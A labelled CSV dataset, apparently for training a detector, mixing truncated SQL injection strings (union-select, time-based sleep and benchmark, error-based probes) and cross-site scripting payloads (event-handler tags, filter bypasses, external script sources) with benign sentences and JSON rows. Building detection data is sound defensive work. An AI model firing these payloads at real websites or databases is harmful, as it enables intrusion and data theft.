Payload,Label,text_label,ID
"-4371' ) ) ) union all select 7465,7465,7465,7465,",2,SQLi,18769
"1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d",2,SQLi,14828
Where should I insert it?,0,normal,23466
<svg><address onload=alert(1)></address>,1,XSS,8861
<script> var contentType = 1; alert(1); var title ,1,XSS,317
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ck",1,XSS,821
"1%"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x765",2,SQLi,18695
Let's choose a book for our book club.,0,normal,23797
Whether you want to be creative and fit a circular,0,normal,25135
1' where 4945 = 4945,2,SQLi,16939
if ( 7899 = 7899 ) select 7899 else drop function ,2,SQLi,15581
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3026
Up to 40% off select Smart Door Locks and Hardware,0,normal,25207
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10813
1'+ ( select ijck where 9961 = 9961 or ( select 2*,2,SQLi,15317
"<datalist onmousedown=""alert(1)"">test</datalist>",1,XSS,2213
"<embed code=""http://businessinfo.co.uk/labs/xss/xs",1,XSS,9166
"-3315"" ) ) ) union all select 2457,2457,2457,2457,",2,SQLi,15061
<ins onpointerover=alert(1)>XSS</ins>,1,XSS,8142
Check conditions where applicable.,0,normal,23322
"""""><script language=""JavaScript""> alert('X \nS \nS",1,XSS,1329
<iframe onpointerup=alert(1)>XSS</iframe>,1,XSS,7155
<strong id=x tabindex=1 onbeforedeactivate=alert(1,1,XSS,4456
<frame onpointerover=alert(1)>XSS</frame>,1,XSS,2637
Sort alphabet.,0,normal,23014
"<basefont onmouseup=""alert(1)"">test</basefont>",1,XSS,6154
1 ) where 7199 = 7199 and 8407 = ( select count ( ,2,SQLi,12287
"{""id"":null,""name"":""check ship go""}",0,normal,27236
<style>:target {color:red;}</style><center id=x st,1,XSS,8209
"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( ra",2,SQLi,14671
Select your game.,0,normal,24923
"""))))) waitfor delay '0:0:20' /*",2,SQLi,10944
1 where 2674 = 2674 and 8514 = ( select count ( * ,2,SQLi,14264
"1"" ) where 6823 = 6823 or char ( 117 ) ||char ( 11",2,SQLi,17650
"-4155' ) ) ) union all select 1775,1775,1775,1775,",2,SQLi,15397
1 where 9404 = 9404,2,SQLi,14239
<table onpointerup=alert(1)>XSS</table>,1,XSS,4449
1 ) ) as hxzh where 9284 = 9284,2,SQLi,22292
1' ) where 2974 = 2974 and 4386 = utl_inaddr.get_h,2,SQLi,16785
1' ( select ( case when ( 4587 = 4587 ) then regex,2,SQLi,19385
1' ) ) as hmyc where 6732 = 6732 and exp ( ~ ( sel,2,SQLi,22458
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,21951
select * from users where id = '1' + ( \ ) union s,2,SQLi,11997
"<kbd draggable=""true"" ondragstart=""alert(1)"">test<",1,XSS,4499
"<audio onpaste=""alert(1)"" contenteditable>test</au",1,XSS,8187
<time onpointerup=alert(1)>XSS</time>,1,XSS,5346
select ( case when ( 5569 = 9390 ) then 5569 else ,2,SQLi,12558
"{""id"":null,""name"":""Wormmon""}",0,normal,26938
") or (1""=""1""--",2,SQLi,9998
-5160' ) as kgjw where 9609 = 9609 union all selec,2,SQLi,15195
"Open the drop-down menu labeled ""Select the skin y",0,normal,25812
"select * from generate_series ( 9058,9058,case whe",2,SQLi,19013
<style>:target {transform: rotate(180deg);}</style,1,XSS,7539
1 ) where 3936 = 3936,2,SQLi,16898
"1"" where 2547 = 2547 or sleep ( 5 ) #",2,SQLi,17095
Select your replace.,0,normal,25048
"-1000"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ",2,SQLi,22148
"<A/hREf=""j%0aavas%09cript%0a:%09con%0afirm%0d``"">z",1,XSS,9568
"<menu ondblclick=""alert(1)"">test</menu>",1,XSS,1964
"1"" where 8089 = 8089",2,SQLi,15248
"1"" ) where 6018 = 6018 and 7533 = 7533--",2,SQLi,14220
Sort the mixed-up letters.,0,normal,22592
"1"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113",2,SQLi,14386
1' ) as knxr where 5662 = 5662 union all select nu,2,SQLi,12435
<li onpointerenter=alert(1)>XSS</li>,1,XSS,5048
<bdi onblur=alert(1) tabindex=1 id=x></bdi><input ,1,XSS,5630
"1"" ) ) as tybm where 2687 = 2687 or elt ( 5873 = 5",2,SQLi,14314
"1%"" ) and ( select 2* ( if ( ( select * from ( sel",2,SQLi,13909
In 1857 he was select preacher at his university.,0,normal,26018
"1' ) where 9304 = 9304 or 6979 = like ( 'abcdefg',",2,SQLi,20657
style=xss:expression(alert(1)),1,XSS,9745
<audio src onloadstart=alert(1)>,1,XSS,9076
"-8490 ) ) union all select 6910,6910,6910,6910,691",2,SQLi,12622
Please unban to pubg and ignore the lame excuses o,0,normal,26483
)) AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) A,2,SQLi,11178
<slot onpointerdown=alert(1)>XSS</slot>,1,XSS,5628
"<frameset onmouseup=""alert(1)"">test</frameset>",1,XSS,3113
"1"" ) as paai where 4089 = 4089 and 3707 = ( select",2,SQLi,12190
-7758%' ) ) ) or 3038 = 3038,2,SQLi,12773
<scr<script>ipt>alert(document.cookie)</scr</scrip,1,XSS,1137
can I select,0,normal,26294
Select that and the driver will know what to do.,0,normal,25608
"{""id"":null,""name"":""African Bush Elephant""}",0,normal,27585
") or (x"")=(""x",2,SQLi,9896
"<font onmousedown=""alert(1)"">test</font>",1,XSS,3003
<INPUT TYPE=âIMAGEâ SRC=âjavascript:alert(âXSSâ);â,1,XSS,944
"<audio onbeforecut=""alert(1)"" contenteditable>test",1,XSS,2184
1 ) ) as ndrh where 6308 = 6308,2,SQLi,19529
Select the item you wish to hide and select Archiv,0,normal,25594
"select count ( * ) from generate_series ( 1,500000",2,SQLi,17087
<form id=x tabindex=1 onactivate=alert(1)></form>,1,XSS,8571
"<span ondblclick=""alert(1)"">test</span>",1,XSS,2929
1' ) ) as crzr where 5373 = 5373 and elt ( 3114 = ,2,SQLi,18856
"<data onmouseup=""alert(1)"">test</data>",1,XSS,3885
"<input name=""password"" type=""password"" value=""secr",1,XSS,9216
AND 1=utl_inaddr.get_host_address((SELECT DISTINCT,2,SQLi,11100
"1%"" ) or 8156 = ( select count ( * ) from generate",2,SQLi,19554
"<body background=javascript:'""><script>alert(navig",1,XSS,1338
"Up to 40% off select Milwaukee Power Tools, Access",0,normal,25209
"<script src=""data:\xCB\x8F,javascript:alert(1)""></",1,XSS,461
<button onInput=javascript:alert(1)>,1,XSS,9621
Select ingredients.,0,normal,24491
select case when 5433 = 6458 then 1 else null end-,2,SQLi,14944
"{""id"":null,""firstName"":""Renee"",""lastName"":""Tan"",""s",0,normal,27256
"1"" ) union all select null,null,null,null#",2,SQLi,13511
<hgroup id=x tabindex=1 onactivate=alert(1)></hgro,1,XSS,2521
"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( """,2,SQLi,15538
<param id=x tabindex=1 onfocus=alert(1)></param>,1,XSS,6349
select ( case when ( 4568 = 4241 ) then 4568 else ,2,SQLi,14984
1%' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ,2,SQLi,17669
"<image onmousemove=""alert(1)"">test</image>",1,XSS,7883
<svg><style>{font-family&colon;'<iframe/onload=con,1,XSS,834
"1' in boolean mode ) and elt ( 3114 = 3114,sleep (",2,SQLi,20595
<isindex type=image src=1 onerror=alert(XSS)>,1,XSS,324
"1, ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 11",2,SQLi,22224
Fortnite servers are really bad today/tonight. Bee,0,normal,26500
"-8869"" where 3019 = 3019 union all select 3019,301",2,SQLi,20139
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10755
-2216 ) ) as hxmq where 5677 = 5677 union all sele,2,SQLi,16582
&lt;IMG SRC=&quot; &amp;#14; javascript:alert(&apo,1,XSS,1443
"<A HREF=""http://google:ha.ckers.org""></A>",1,XSS,7104
? or 1=1 --,2,SQLi,11055
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4694
-7580' ) ) as mmqt where 3468 = 3468 union all sel,2,SQLi,15544
"1%"" and 1343 = 5939#",2,SQLi,20367
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:al,1,XSS,1413
"<;A HREF="";//www.google.com/"";>;XSS<;/A>;",1,XSS,1673
1 ) as ratg where 3033 = 3033 union all select nul,2,SQLi,15519
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)",1,XSS,611
<output onpointerout=alert(1)>XSS</output>,1,XSS,7015
"<var onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,7386
"<applet draggable=""true"" ondrag=""alert(1)"">test</a",1,XSS,7498
"-2323"" ) as zgsn where 9274 = 9274 or 3440 = cast ",2,SQLi,12392
Exela Technologies will be listed on the Nasdaq Gl,0,normal,26206
"1"" ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 1",2,SQLi,22287
The government may select the documents for her to,0,normal,25437
"1"" ) as eomu where 6599 = 6599",2,SQLi,21016
select * from users where id = 1 + $+*$ union sele,2,SQLi,11436
"<blockquote ondblclick=""alert(1)"">test</blockquote",1,XSS,8835
Y.) Permanent Select Committee on IntelligenceChai,0,normal,25109
"1 ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a",2,SQLi,20552
"<i onmouseout=""alert(1)"">test</i>",1,XSS,3897
Join band.,0,normal,23034
"select * from generate_series ( 5846,5846,case whe",2,SQLi,15674
"end and ( ( ""rqay"" like ""rqay",2,SQLi,12149
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('');"">",1,XSS,2995
"1"" ) ) as zemm where 3324 = 3324 or 2367 = ( selec",2,SQLi,19073
"-3359 union all select 4675,4675,4675--",2,SQLi,21693
"<var onmouseup=""alert(1)"">test</var>",1,XSS,5958
1 ) or 5286 = ( select count ( * ) from all_users ,2,SQLi,12576
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q,1,XSS,2487
or 1 = 1 /*,2,SQLi,11618
<listing onpointerup=alert(1)>XSS</listing>,1,XSS,5795
"1"" where 4672 = 4672",2,SQLi,16385
Select now.,0,normal,24479
"{""id"":null,""name"":""Serperior""}",0,normal,27207
The team decided to order pizza for lunch.,0,normal,22910
UNION ALL SELECT 1--,2,SQLi,10563
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,19703
<figure onblur=alert(1) tabindex=1 id=x></figure><,1,XSS,6499
"{""id"":null,""firstName"":""Ann"",""lastName"":""Lee"",""add",0,normal,27280
<style>:target {color:red;}</style><rp id=x style=,1,XSS,4985
Join the art class.,0,normal,22720
<shadow id=x tabindex=1 ondeactivate=alert(1)></sh,1,XSS,5819
"Ideally, ask someone else to select a small platef",0,normal,26061
"1"" ) ) as dooq where 7911 = 7911",2,SQLi,21938
"-3971%' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ",2,SQLi,12720
"<object onmouseenter=""alert(1)"">test</object>",1,XSS,6936
waitfor delay '0:0:5' and 'gsvt' = 'gsvt,2,SQLi,19521
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></x,1,XSS,2538
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#",2,SQLi,10806
1 ) as bfuy where 3879 = 3879 and char ( 107 ) ||c,2,SQLi,13176
<dl onblur=alert(1) tabindex=1 id=x></dl><input au,1,XSS,8485
"-7531' ) ) ) union all select 6900,6900,6900,6900,",2,SQLi,18843
/></a></><img src=1.gif onerror=alert(1)>window.al,1,XSS,1300
"<html onMouseLeave html onMouseLeave=""javascript:j",1,XSS,384
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS,1,XSS,1404
"<input draggable=""true"" ondragstart=""alert(1)"">tes",1,XSS,7746
"<blockquote onmousemove=""alert(1)"">test</blockquot",1,XSS,6871
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",2,SQLi,10745
In 1757 Voltaire came to reside at Lausanne; and a,0,normal,26027
<keygen onfocusout=alert(1) tabindex=1 id=x></keyg,1,XSS,5735
1' ) ) ) and 8514 = ( select count ( * ) from doma,2,SQLi,13104
"UNION ALL SELECT 1,2,3,4,5,6,7",2,SQLi,10509
-7941 or ( 5822 = 8754 ) *8754-- eepn,2,SQLi,12769
"<element draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,7585
Show me where it's stored.,0,normal,23263
"1%"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745",2,SQLi,19314
<style>:target {color: red;}</style><option id=x s,1,XSS,3919
Select a book for your leisure.,0,normal,23995
1 ) ) ) and ( 6148 = 3343 ) *3343 and ( ( ( 3271 =,2,SQLi,18792
Select disapprove.,0,normal,24574
"For the ultimate in personalized indulgence, selec",0,normal,26171
"1%"" ) ( select ( case when ( 5451 = 5451 ) then re",2,SQLi,21436
"{""id"":null,""name"":""Milkfish""}",0,normal,27237
<style>:target {color: red;}</style><element id=x ,1,XSS,7469
"<fieldset draggable=""true"" ondrag=""alert(1)"">test<",1,XSS,4181
view,0,normal,23154
1' ) ) ) and 6510 = ( select count ( * ) from sysu,2,SQLi,20746
<colgroup onblur=alert(1) tabindex=1 id=x></colgro,1,XSS,1753
1 ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ),2,SQLi,19515
"-9440"" union all select 5599,5599,5599,5599,5599--",2,SQLi,12788
You can also select from a number of preset pictur,0,normal,25100
<div id=x tabindex=1 onbeforeactivate=alert(1)></d,1,XSS,8768
1' rlike ( select ( case when ( 7689 = 7689 ) then,2,SQLi,16947
"select count ( * ) from generate_series ( 1,500000",2,SQLi,12119
1'|| ( select 'rawn' from dual where 4988 = 4988 o,2,SQLi,12097
"<listing onmouseenter=""alert(1)"">test</listing>",1,XSS,8339
Funan continues in screenings at select theaters n,0,normal,26152
"<p onbeforecopy=""alert(1)"" contenteditable>test</p",1,XSS,5360
Up to 40% off select DeWalt Power Tools and Access,0,normal,25212
<span onpointerout=alert(1)>XSS</span>,1,XSS,5202
<image id=x tabindex=1 onbeforeactivate=alert(1)><,1,XSS,2798
"{""id"":null,""name"":""Minun""}",0,normal,26994
<source id=x tabindex=1 onfocus=alert(1)></source>,1,XSS,6443
Select your championship.,0,normal,24927
1 ) ) as myxo where 1759 = 1759 union all select n,2,SQLi,21585
<style>:target {color:red;}</style><meter id=x sty,1,XSS,3843
How did you select characters from the many people,0,normal,26083
1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ),2,SQLi,18134
"<time draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,6720
"-1339 ) ) ) union all select 6318,6318,6318,6318,6",2,SQLi,21135
"{""id"":null,""firstName"":""Ian"",""lastName"":""Chong"",""s",0,normal,26929
<meter onblur=alert(1) tabindex=1 id=x></meter><in,1,XSS,8871
<image id=x tabindex=1 ondeactivate=alert(1)></ima,1,XSS,4594
"<slot onkeypress=""alert(1)"" contenteditable>test</",1,XSS,7663
document.write,1,XSS,1836
Delete expired items.,0,normal,22770
"<q draggable=""true"" ondragenter=""alert(1)"">test</q",1,XSS,2318
Select your race.,0,normal,24922
"-4797' union all select 8223,8223,8223,8223,8223,8",2,SQLi,21743
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10433
<style>:target {transform: rotate(180deg);}</style,1,XSS,7685
-2748' ) ) as gazw where 4624 = 4624 union all sel,2,SQLi,13082
1 ) ) as zkrr where 4730 = 4730 or 8466 = benchmar,2,SQLi,22200
Plant some colorful flowers.,0,normal,22625
"1"" ) where 8462 = 8462 and updatexml ( 3393,concat",2,SQLi,18520
Select records where valid.,0,normal,23245
"<form onmousedown=""alert(1)"">test</form>",1,XSS,2004
"select * from users where id = 1 or ""%["" or 1 = 1 ",2,SQLi,11465
<caption onpointerout=alert(1)>XSS</caption>,1,XSS,7656
-9541 ) as bnky where 3934 = 3934 union all select,2,SQLi,19069
"1' ) ) procedure analyse ( extractvalue ( 9255,con",2,SQLi,15683
"<pre onkeypress=""alert(1)"" contenteditable>test</p",1,XSS,7629
1,0,normal,26679
"<center onkeydown=""alert(1)"" contenteditable>test<",1,XSS,4131
Where's the best ice cream shop?,0,normal,23495
"1' in boolean mode ) and 3202 = like ( 'abcdefg',u",2,SQLi,18165
1 RLIKE SLEEP(5),2,SQLi,11218
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2155
1 ) as wxms where 7272 = 7272 and 3707 = ( select ,2,SQLi,14193
Select a color.,0,normal,24812
-1854' ) as fmmq where 7326 = 7326 or 3440 = cast ,2,SQLi,17418
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></,1,XSS,8610
"<header onkeydown=""alert(1)"" contenteditable>test<",1,XSS,4423
<listing id=x tabindex=1 ondeactivate=alert(1)></l,1,XSS,8380
<details id=x tabindex=1 onbeforedeactivate=alert(,1,XSS,8069
"Once you select (or create) a pattern, drawing, or",0,normal,25830
"1%"" order by 1#",2,SQLi,17654
<samp onpointerout=alert(1)>XSS</samp>,1,XSS,6784
<del onblur=alert(1) tabindex=1 id=x></del><input ,1,XSS,6181
"1' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",2,SQLi,15223
1 ) ) ) and 6467 = 1864#,2,SQLi,13317
<nav onpointerup=alert(1)>XSS</nav>,1,XSS,3760
"<small onkeypress=""alert(1)"" contenteditable>test<",1,XSS,6711
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",2,SQLi,10746
"<a href=""&#x6a;avascript:alert(1)"">XSS</a>",1,XSS,195
"AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND 13",2,SQLi,11307
1 ) where 6990 = 6990 and 2716 = ( select count ( ,2,SQLi,13515
"1%' ) ) and extractvalue ( 7982,concat ( 0x5c,0x71",2,SQLi,13384
<style>@keyframes slidein {}</style><script style=,1,XSS,2210
<x contenteditable onfocus=alert(1)>focus this!,1,XSS,9337
"<style>@keyframes x{}</style><big style=""animation",1,XSS,2666
"<section onpaste=""alert(1)"" contenteditable>test</",1,XSS,6072
"""My tank's for utilitarian purposes,"" he told Sele",0,normal,26456
"{""id"":null,""name"":""might got nature""}",0,normal,27144
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(",2,SQLi,11015
"1%"" ) ) ) and ( select 2* ( if ( ( select * from (",2,SQLi,22332
"-8943%' ) union all select 7710,7710#",2,SQLi,14768
"There will be extended hours on select dates, incl",0,normal,25327
1 ) ) as xsyk where 2575 = 2575 or 8156 = ( select,2,SQLi,14567
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2774
1' ) where 7646 = 7646 and 3580 = ( select count (,2,SQLi,13961
"-4807' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr (",2,SQLi,18309
"1"" ) as lipa where 3450 = 3450 and make_set ( 8403",2,SQLi,21261
1' where 3362 = 3362,2,SQLi,15869
"-eval(window['pro'%2B'mpt'](8)"")-'",1,XSS,342
<xss onpointerenter=alert(1) style=display:block>X,1,XSS,88
"-9928"" ) ) union all select 7511,7511,7511,7511,75",2,SQLi,21986
1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( ch,2,SQLi,15074
"1"" ) ) ) and 3707 = ( select count ( * ) from sysi",2,SQLi,22470
Select your research.,0,normal,24992
"1%"" ) ) and 6283 = 2068 and ( ( ""%"" = """,2,SQLi,16491
"<rp draggable=""true"" ondrag=""alert(1)"">test</rp>",1,XSS,8455
"<shadow oncopy=""alert(1)"" contenteditable>test</sh",1,XSS,2457
Modify the text.,0,normal,22838
"<datalist onmousemove=""alert(1)"">test</datalist>",1,XSS,6135
><script+src=https://www.meteoprog.ua/data/weather,1,XSS,9810
<input type=checkbox id=x onfocus=alert(1)>,1,XSS,5866
23 OR 1=1,2,SQLi,10169
"select * from generate_series ( 2317,2317,case whe",2,SQLi,14615
<style>@keyframes slidein {}</style><shadow style=,1,XSS,1785
"<video onmousedown=""alert(1)"">test</video>",1,XSS,5969
"{""id"":null,""name"":""Imperialdramon FM""}",0,normal,27603
"-3475"" or elt ( 5532 = 4242,4242 )",2,SQLi,12441
Select the font.,0,normal,22867
"<D3""<""/OncLick=""1>[confirm``]""<"">z",1,XSS,9046
<param onpointerdown=alert(1)>XSS</param>,1,XSS,5717
Usually these electors select the candidate you'd ,0,normal,25190
"<legend onclick=""alert(1)"">test</legend>",1,XSS,7181
"<head oncut=""alert(1)"" contenteditable>test</head>",1,XSS,2585
"-5202 union all select 5332,5332,5332,5332,5332,53",2,SQLi,18564
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1,XSS,255
"-9289 ) ) or make_set ( 5101 = 9919,9919 ) and ( (",2,SQLi,15027
Insert the link.,0,normal,22865
1' ) and ( select 2* ( if ( ( select * from ( sele,2,SQLi,12434
"<rtc oncontextmenu=""alert(1)"">test</rtc>",1,XSS,2047
Select your outshine.,0,normal,25011
"1"" ) where 9093 = 9093",2,SQLi,21349
1'+ ( select oogh where 1167 = 1167 or elt ( 5873 ,2,SQLi,21018
"<b onmousedown=""alert(1)"">test</b>",1,XSS,2209
<address onpointerleave=alert(1)>XSS</address>,1,XSS,3047
Select a password that's secure.,0,normal,24209
if ( 4947 = 5350 ) select 4947 else drop function ,2,SQLi,18832
"1"" ) where 5828 = 5828 or 8384 = like ( 'abcdefg',",2,SQLi,21132
"<tr draggable=""true"" ondrag=""alert(1)"">test</tr>",1,XSS,6100
1,0,normal,26723
"<dialog onkeypress=""alert(1)"" contenteditable>test",1,XSS,3675
x' or 1 = 1 or 'x' = 'y,2,SQLi,11890
"1%"" ) ) ) or 4411 = ( select count ( * ) from sysu",2,SQLi,20439
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d,2,SQLi,10336
"1%"" ) ) union all select null,null,null,null,null,",2,SQLi,15480
select,0,normal,26598
1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ,2,SQLi,14839
"{""id"":null,""firstName"":""Amir"",""lastName"":""Said"",""s",0,normal,27295
"<wbr onclick=""alert(1)"">test</wbr>",1,XSS,5919
"-3436 ) or elt ( 1032 = 1032,3623 )",2,SQLi,22097
-8625 or 3176 = 2519# fvgl,2,SQLi,18130
"1' ) and row ( 6237,7469 ) > ( select count ( * ) ",2,SQLi,15747
"1"" ) ) ) and 9198 = 9198--",2,SQLi,17166
"<image onkeypress=""alert(1)"" contenteditable>test<",1,XSS,7262
"For a select few beer geeks, the answer is yes.",0,normal,26181
Filter the junk emails.,0,normal,22755
select name from syscolumns where id = ( sele ...,2,SQLi,11842
"{""id"":null,""name"":""that tiny""}",0,normal,26828
"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( (",2,SQLi,15898
"<style>@keyframes x{}</style><small style=""animati",1,XSS,5201
Where's the fair?,0,normal,23587
"{""id"":null,""name"":""please ring""}",0,normal,27003
"<th onclick=""alert(1)"">test</th>",1,XSS,5168
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("""")>",1,XSS,5124
1' ) as ssez where 5351 = 5351 or char ( 119 ) ||c,2,SQLi,20343
1' ) ) as iipj where 6560 = 6560,2,SQLi,13965
-4557 or 6872 = 6872-- kkte,2,SQLi,12797
<q id=x tabindex=1 ondeactivate=alert(1)></q><inpu,1,XSS,3365
"{""id"":null,""name"":""lower troops""}",0,normal,27216
<audio autoplay onloadedmetadata=alert(1)> <source,1,XSS,24
@BlizzardCS IÃ¢â¬â¢ve struggled trying to get into @P,0,normal,26511
1'|| ( select 'zzkx' where 3270 = 3270 and 2006 = ,2,SQLi,15138
<style>:target {transform: rotate(180deg);}</style,1,XSS,7178
